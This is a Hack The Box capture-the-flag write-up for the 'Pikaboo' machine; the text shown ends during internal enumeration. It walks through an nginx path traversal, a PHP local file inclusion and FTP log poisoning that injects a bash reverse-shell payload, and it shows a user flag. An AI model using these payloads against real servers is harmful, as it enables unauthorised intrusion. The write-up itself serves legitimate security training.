<!doctype html><html lang=es>
<head>
<title>Pikaboo | 7Rocky</title>
<meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
<meta name=viewport content="width=device-width,minimum-scale=1">
<meta name=description content="Hack The Box. Linux. Hard machine. This machine uses nginx and Apache web servers with a misconfiguration that derives in directory path traversal and afterwards in local file inclusion. There are credentials for FTP in LDAP and a Cron job that is vulnerable to command injection. Web enumeration, knowledge about nginx and LDAP, file inclusion techniques and command injection tricks are needed to compromise this machine. This write-up uses a custom Python script to compromise the entire machine from scratch">
<meta name=robots content="index, follow">
<meta name=image content="https://7rocky.github.io/images/HTB/Pikaboo/Pikaboo.png">
<meta name=author content="7Rocky">
<meta property="og:title" content="Pikaboo">
<meta property="og:description" content="Hack The Box. Linux. Hard machine. This machine uses nginx and Apache web servers with a misconfiguration that derives in directory path traversal and afterwards in local file inclusion. There are credentials for FTP in LDAP and a Cron job that is vulnerable to command injection. Web enumeration, knowledge about nginx and LDAP, file inclusion techniques and command injection tricks are needed to compromise this machine. This write-up uses a custom Python script to compromise the entire machine from scratch">
<meta property="og:type" content="article">
<meta property="og:url" content="https://7rocky.github.io/en/htb/pikaboo/"><meta property="article:section" content="htb">
<meta property="article:published_time" content="2021-12-04T00:00:00+01:00">
<meta property="article:modified_time" content="2022-01-24T02:55:10+01:00"><meta property="og:site_name" content="7Rocky">
<meta property="og:image" content="https://7rocky.github.io/images/HTB/Pikaboo/Pikaboo.png">
<meta property="og:author" content="7Rocky">
<meta itemprop=name content="Pikaboo">
<meta itemprop=description content="Hack The Box. Linux. Hard machine. This machine uses nginx and Apache web servers with a misconfiguration that derives in directory path traversal and afterwards in local file inclusion. There are credentials for FTP in LDAP and a Cron job that is vulnerable to command injection. Web enumeration, knowledge about nginx and LDAP, file inclusion techniques and command injection tricks are needed to compromise this machine. This write-up uses a custom Python script to compromise the entire machine from scratch"><meta itemprop=datePublished content="2021-12-04T00:00:00+01:00">
<meta itemprop=dateModified content="2022-01-24T02:55:10+01:00">
<meta itemprop=wordCount content="3169">
<meta itemprop=keywords content="ftp,perl,ldap,cronjob,log-poisoning,lfi,command-injection,directory-path-traversal,rce,">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="Pikaboo">
<meta name=twitter:description content="Hack The Box. Linux. Hard machine. This machine uses nginx and Apache web servers with a misconfiguration that derives in directory path traversal and afterwards in local file inclusion. There are credentials for FTP in LDAP and a Cron job that is vulnerable to command injection. Web enumeration, knowledge about nginx and LDAP, file inclusion techniques and command injection tricks are needed to compromise this machine. This write-up uses a custom Python script to compromise the entire machine from scratch">
<meta name=twitter:image content="https://7rocky.github.io/images/HTB/Pikaboo/Pikaboo.png">
<meta name=twitter:author content="7Rocky">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-Z1HQGH3M4D',{anonymize_ip:!1})}</script>
<link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon>
<link href=/css/style.css rel=stylesheet>
<link href=/css/monokai-sublime.min.css rel=stylesheet>
<link href=/css/code.css rel=stylesheet>
<link href=/css/main.css rel=stylesheet>
<script src=/js/highlight.min.js></script>
<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script>
<script src=//mozilla.github.io/pdf.js/build/pdf.js></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script type=text/x-mathjax-config>MathJax.Hub.Config({messageStyle:'none',tex2jax:{displayMath:[['$$','$$']],inlineMath:[['$','$']],processEnvironments:!0,processEscapes:!0,skipTags:['noscript','pre','script','style','textarea'],TeX:{equationNumbers:{autoNumber:'AMS'},extensions:['AMSmath.js','AMSsymbols.js']}}})</script>
<script src=/js/main.js></script>
<div style=display:none>
$
\newcommand{\e}{e}
\newcommand{\N}[1][]{\mathbb{N}^{#1}}
\newcommand{\Q}[1][]{\mathbb{Q}^{#1}}
\newcommand{\R}[1][]{\mathbb{R}^{#1}}
\newcommand{\Z}[1][]{\mathbb{Z}^{#1}}
\newcommand{\C}[1][]{\mathbb{C}^{#1}}
\newcommand{\dx}{\,\mathrm{d}x}
\newcommand{\dy}{\,\mathrm{d}y}
\newcommand{\dz}{\,\mathrm{d}z}
\newcommand{\dt}{\,\mathrm{d}t}
\newcommand{\divides}{\, | \,}
\newcommand{\st}{\; | \;}
\renewcommand{\geq}{\geqslant}
\renewcommand{\leq}{\leqslant}
\renewcommand{\i}{\mathrm{i}}
\newcommand{\rank}{\mathop{\mathrm{rank}}}
\newcommand{\tr}{\mathop{\mathrm{tr}}}
\newcommand{\charField}{\mathop{\mathrm{char}}}
\newcommand{\Image}{\mathop{\mathrm{Im}}}
$
</div>
</head>
<body class="ma0 production">
<header>
<div class=bg-black>
<nav class="pv3 ph3 ph4-ns" role=navigation>
<div class="flex-l justify-between items-center center">
<a class="f3 fw2 hover-white no-underline white-90 dib" href=/en/ title=7Rocky>7Rocky</a>
<div class="flex-l items-center">
<a class="link-transition github link dib z-999 pt3 pt0-l mr3" href=/htb/pikaboo/ title=es>
<img alt=es height=32px src=/images/es.png width=32px>
</a>
<ul class="pl0 ml3 mr3">
<li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/en/ctf/ title=CTF>CTF</a>
</li>
<li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/en/htb/ title=HTB>HTB</a>
</li>
<li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/en/imc/ title=IMC>IMC</a>
</li>
</ul>
<a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
</div>
</div>
</nav>
</div>
</header>
<main class=pb7 role=main>
<article class="flex-l flex-wrap justify-between mw8 center ph3">
<header class="mt4 w-100">
<aside aria-label=aside class="instapaper_ignoref b helvetica tracked">HTB</aside>
<div id=sharing class=mt3>
<a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/htb/pikaboo/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a>
<a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/htb/pikaboo/&text=Pikaboo" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a>
<a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/en/htb/pikaboo/&title=Pikaboo" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a>
</div>
<h1 class="f1 mt3 mb1">Pikaboo</h1>
<time class="f6 mv4 dib tracked" datetime=2021-12-04T00:00:00+01:00>04 / 12 / 2021</time>
</header>
<div class=htb-image>
<img alt=Pikaboo src=/images/HTB/Pikaboo/Pikaboo.png>
</div>
<ul class="nested-links tags">
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/ftp title=FTP>FTP</a>
</li>
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/perl title=Perl>Perl</a>
</li>
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/ldap title=LDAP>LDAP</a>
</li>
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/cronjob title="Cron jobs">Cron jobs</a>
</li>
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/log-poisoning title="Log Poisoning">Log Poisoning</a>
</li>
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/lfi title="Local File Inclusion">Local File Inclusion</a>
</li>
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/command-injection title="Command Injection">Command Injection</a>
</li>
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/directory-path-traversal title="Directory Path Traversal">Directory Path Traversal</a>
</li>
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/rce title="Remote Code Execution">Remote Code Execution</a>
</li>
</ul>
<aside aria-label=aside class="w-20-l mt6-l aside-mobile">
<div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:2rem>
<p class="f5 b mb3">Contents of this write-up</p>
<nav id=TableOfContents>
<ul>
<li><a href=#port-scanning>Port scanning</a></li>
<li><a href=#web-enumeration>Web enumeration</a></li>
<li><a href=#performing-a-directory-path-traversal>Performing a Directory Path Traversal</a></li>
<li><a href=#finding-an-lfi>Finding an LFI</a></li>
<li><a href=#ftp-log-poisoning>FTP log poisoning</a></li>
<li><a href=#system-enumeration>System enumeration</a></li>
<li><a href=#ldap-enumeration>LDAP enumeration</a></li>
<li><a href=#finding-a-cron-job>Finding a Cron job</a></li>
<li><a href=#exploiting-a-command-injection>Exploiting a command injection</a></li>
</ul>
</nav>
</div>
</aside>
<div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul>
<li>
<strong>OS</strong>: Linux
</li>
<li>
<strong>Difficulty</strong>: Hard
</li>
<li>
<strong>IP Address</strong>: 10.10.10.249
</li>
<li>
<strong>Release</strong>: 17 / 07 / 2021
</li>
</ul>
<h2 id=port-scanning>Port scanning</h2>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext># Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.10.249 -p 21,22,80
Nmap scan report for 10.10.10.249
Host is up (0.045s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 17:e1:13:fe:66:6d:26:b6:90:68:d0:30:54:2e:e2:9f (RSA)
|   256 92:86:54:f7:cc:5a:1a:15:fe:c6:09:cc:e5:7c:0d:c3 (ECDSA)
|_  256 f4:cd:6f:3b:19:9c:cf:33:c6:6d:a5:13:6a:61:01:42 (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Pikaboo
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done -- 1 IP address (1 host up) scanned in 10.16 seconds
</code></pre></div><p>This machine has ports 21 (FTP), 22 (SSH) and 80 (HTTP) open.</p>
<h2 id=web-enumeration>Web enumeration</h2>
<p>If we enter <code>http://10.10.10.249</code> in the browser, we will see the following website:</p>
<p><img src=../../../images/HTB/Pikaboo/Pikaboo-web.png alt="Pikaboo web"></p>
<p>We can also have a look at the &ldquo;Pokatdex&rdquo;:</p>
<p><img src=../../../images/HTB/Pikaboo/Pikaboo-pokatdex.png alt="Pikaboo Pokatdex"></p>
<p>There seems to be an administration panel, but we are not allowed to enter since we do not have credentials (when accessing <code>/admin</code>, we are requested for credentials via HTTP Basic Authentication):</p>
<p><img src=../../../images/HTB/Pikaboo/Pikaboo-403.png alt="Pikaboo Admin 403"></p>
<p>Using <code>gobuster</code>, we can list some directories on the web server and see something weird:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ gobuster dir -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -q -r -u http://10.10.10.249
/images               (Status: 403) [Size: 274]
/admin                (Status: 401) [Size: 456]
/administration       (Status: 401) [Size: 456]
/administrator        (Status: 401) [Size: 456]
/administr8           (Status: 401) [Size: 456]
/administrative       (Status: 401) [Size: 456]
/administratie        (Status: 401) [Size: 456]
/admins               (Status: 401) [Size: 456]
/admin_images         (Status: 401) [Size: 456]
/administrivia        (Status: 401) [Size: 456]
/administrative-law   (Status: 401) [Size: 456]
/administrators       (Status: 401) [Size: 456]
/admin1               (Status: 401) [Size: 456]
/administer           (Status: 401) [Size: 456]
/admin3_gtpointup     (Status: 401) [Size: 456]
/admin_hp             (Status: 401) [Size: 456]
/admin25              (Status: 401) [Size: 456]
/admin02              (Status: 401) [Size: 456]
/administrationinfo   (Status: 401) [Size: 456]
/admin_thumb          (Status: 401) [Size: 456]
/admin_full           (Status: 401) [Size: 456]
/admin_functions      (Status: 401) [Size: 456]
/admin2               (Status: 401) [Size: 456]
/adminhelp            (Status: 401) [Size: 456]
/adminoffice          (Status: 401) [Size: 456]
/administracja        (Status: 401) [Size: 456]
</code></pre></div><p>As shown, it seems that the server is requesting for authentication when the URL starts with <code>/admin</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ curl http://10.10.10.249/adminasdf
&lt;!DOCTYPE HTML PUBLIC &#34;-//IETF//DTD HTML 2.0//EN&#34;&gt;
&lt;html&gt;&lt;head&gt;
&lt;title&gt;401 Unauthorized&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Unauthorized&lt;/h1&gt;
&lt;p&gt;This server could not verify that you
are authorized to access the document
requested.  Either you supplied the wrong
credentials (e.g., bad password), or your
browser doesn&#39;t understand how to supply
the credentials required.&lt;/p&gt;
&lt;hr&gt;
&lt;address&gt;Apache/2.4.38 (Debian) Server at 127.0.0.1 Port 81&lt;/address&gt;
&lt;/body&gt;&lt;/html&gt;
</code></pre></div><p>Moreover, notice that the server response is from Apache/2.4.38 on port 81. The output of <code>nmap</code> showed that the server on port 80 is nginx.</p>
<p>The images that appear in the website are hosted in an nginx server, again looking at the error message:</p>
<p><img src=../../../images/HTB/Pikaboo/Pikaboo-image-404.png alt="Pikaboo nginx error"></p>
<h2 id=performing-a-directory-path-traversal>Performing a Directory Path Traversal</h2>
<p>There could be some misconfiguration between these web servers, and probably it is related to the <code>/admin</code> route. Trying to fuzz looking for a Directory Path Traversal, we obtain the following:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ ffuf -u <span style=color:#e6db74>&#39;http://10.10.10.249/admin../FUZZ&#39;</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt
admin                   [Status: 401, Size:  456, Words:  42, Lines:  15]
javascript              [Status: 301, Size:  314, Words:  20, Lines:  10]
                        [Status: 403, Size:  274, Words:  20, Lines:  10]
server-status           [Status: 200, Size: 5815, Words: 269, Lines: 114]
</code></pre></div><p>We see that we can perform a Directory Path Traversal. However, we are not allowed to enter at <code>/admin../admin</code> because we do not have any credentials to use.</p>
<p>We can check if there are more directories whose name starts with <code>admin</code>. For instance:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ ffuf -u <span style=color:#e6db74>&#39;http://10.10.10.249/admin../adminFUZZ&#39;</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt
                        [Status: 401, Size: 456, Words: 42, Lines: 15]
<span style=color:#960050;background-color:#1e0010>
</span><span style=color:#960050;background-color:#1e0010></span>$ ffuf -u <span style=color:#e6db74>&#39;http://10.10.10.249/admin../admin_FUZZ&#39;</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt
staging                 [Status: 301, Size: 317, Words: 20, Lines: 10]
</code></pre></div><p>And we get that there exists a directory called <code>admin_staging</code>, and it is accessible.</p>
<p>Now we can enter <code>http://10.10.10.249/admin../admin_staging/</code> bypassing the authentication requirements:</p>
<p><img src=../../../images/HTB/Pikaboo/Pikaboo-admin_staging.png alt="Pikaboo admin_staging"></p>
<h2 id=finding-an-lfi>Finding an LFI</h2>
<p>Inspecting the website, we see that the server is including PHP files using a GET parameter, as follows:</p>
<p><img src=../../../images/HTB/Pikaboo/Pikaboo-user.png alt="Pikaboo user"></p>
<p>We can fuzz again with <code>ffuf</code> to look for available files:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ ffuf -u <span style=color:#e6db74>&#39;http://10.10.10.249/admin../admin_staging/index.php?page=FUZZ.php&#39;</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -fw <span style=color:#ae81ff>3272</span>
info                    [Status: 200, Size: 86990, Words:  6716, Lines: 1170]
user                    [Status: 200, Size: 24978, Words:  7266, Lines:  578]
index                   [Status: 200, Size:     0, Words:     1, Lines:    1]
dashboard               [Status: 200, Size: 40555, Words: 15297, Lines:  883]
tables                  [Status: 200, Size: 29131, Words: 11707, Lines:  744]
typography              [Status: 200, Size: 24923, Words:  6989, Lines:  567]
</code></pre></div><p>When retrieving these files, we notice that the code is being interpreted. This is a sign that we have a Local File Inclusion (LFI) vulnerability.</p>
<p>To actually read the source code of PHP files, we can make use of PHP wrappers (for instance, encode the content in Base64 and decode it afterwards). For example, we can try with <code>admin_staging/index.php</code>:</p>
<p><img src=../../../images/HTB/Pikaboo/Pikaboo-wrapper.png alt="Pikaboo wrapper"></p>
<p>If we take the huge Base64 string and decode it, we see a fragment of PHP code that shows how the file inclusion is being handled:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;page&#39;</span>])) {
    <span style=color:#66d9ef>include</span>($_GET[<span style=color:#e6db74>&#39;page&#39;</span>]);
  } <span style=color:#66d9ef>else</span> {
    <span style=color:#66d9ef>include</span>(<span style=color:#e6db74>&#39;dashboard.php&#39;</span>);
  }
<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></code></pre></div><p>However, the server only allows to read specific files (apart from the PHP ones). This configuration can be retrieved from <code>admin_staging/info.php</code>, which contains a <code>phpinfo()</code> and shows that the files can only be included from <code>/var/</code>.</p>
<h2 id=ftp-log-poisoning>FTP log poisoning</h2>
<p>Taking into accoung that there is an FTP server, the idea is to do Log Poisoning using the FTP log. This log file (<code>/var/log/vsftpd.log</code>) is readable:</p>
<p><img src=../../../images/HTB/Pikaboo/Pikaboo-log.png alt="Pikaboo log"></p>
<p>This technique consists of inserting PHP code inside the log file, so that when being included in the website the PHP code is executed.</p>
<p>Looking at the FTP log file, we see that the username is being reflected, so that is the field where the PHP code must be in order to have Remote Code Execution (RCE).</p>
<p>Let&rsquo;s use a system command to obtain a reverse shell from the machine (make sure to enter some characters for the password):</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ ftp 10.10.10.249
Connected to 10.10.10.249.
220 (vsFTPd 3.0.3)
Name (10.10.10.249:rocky): &lt;?php system(&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.17.44/4444 0&gt;&amp;1&#39;&#34;); ?&gt;
331 Please specify the password.
Password:
530 Login incorrect.
ftp: Login failed.
ftp&gt; quit
221 Goodbye.
</code></pre></div><p>Now that the FTP log is poisoned, we can retrieve it using the LFI, so that the injected PHP code is executed. Using a <code>nc</code> listener, we get access to the machine:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ curl <span style=color:#e6db74>&#39;http://10.10.10.249/admin../admin_staging/index.php?page=/var/log/vsftpd.log&#39;</span>
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ nc -nlvp <span style=color:#ae81ff>4444</span>
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.249.
Ncat: Connection from 10.10.10.249:60272.
bash: cannot set terminal process group (664): Inappropriate ioctl for device
bash: no job control in this shell
www-data@pikaboo:/var/www/html/admin_staging$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@pikaboo:/var/www/html/admin_staging$ ^Z
zsh: suspended  ncat -nlvp 4444
<span style=color:#960050;background-color:#1e0010>
</span><span style=color:#960050;background-color:#1e0010></span>$ stty raw -echo; fg
[1]  + continued  ncat -nlvp 4444
                                 reset xterm
www-data@pikaboo:/var/www/html/admin_staging$ export TERM=xterm
www-data@pikaboo:/var/www/html/admin_staging$ export SHELL=bash
www-data@pikaboo:/var/www/html/admin_staging$ stty rows 50 columns 158
</code></pre></div><h2 id=system-enumeration>System enumeration</h2>
<p>We can read the <code>user.txt</code> flag as <code>www-data</code>, although being inside the home directory of <code>pwnmeow</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>www-data@pikaboo:/var/www/html/admin_staging$ ls -l /home
total 560
drwxr-xr-x  2 pwnmeow pwnmeow 569344 Jul  6 20:02 pwnmeow
www-data@pikaboo:/var/www/html/admin_staging$ ls -la /home/pwnmeow/
total 580
drwxr-xr-x 2 pwnmeow pwnmeow  569344 Jul  6 20:02 .
drwxr-xr-x 3 root    root       4096 May 10 10:26 ..
lrwxrwxrwx 1 root    root          9 Jul  6 20:02 .bash_history -&gt; /dev/null
-rw-r--r-- 1 pwnmeow pwnmeow     220 May 10 10:26 .bash_logout
-rw-r--r-- 1 pwnmeow pwnmeow    3526 May 10 10:26 .bashrc
-rw-r--r-- 1 pwnmeow pwnmeow     807 May 10 10:26 .profile
lrwxrwxrwx 1 root    root          9 Jul  6 20:01 .python_history -&gt; /dev/null
-r--r----- 1 pwnmeow www-data     33 Aug 29 22:20 user.txt
www-data@pikaboo:/var/www/html/admin_staging$ cat /home/pwnmeow/user.txt
f3417b113fe715a58e02f9e29fe6c736
</code></pre></div><p>Now we can enumerate open ports from inside the machine and discover that port 389 (LDAP) is open:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>www-data@pikaboo:/var/www/html/admin_staging$ cd /
www-data@pikaboo:/$ for i in $(seq 1 65535); do timeout 1 echo 2&gt;/dev/null &gt; /dev/tcp/127.0.0.1/$i &amp;&amp; echo &#34;Port $i open&#34;; done
Port 21 open
Port 22 open
Port 80 open
Port 81 open
Port 389 open
</code></pre></div><p>An easier way to enumerate internal open ports is using <code>netstat</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>www-data@pikaboo:/$ netstat -nat
Active Internet connections (servers and established)
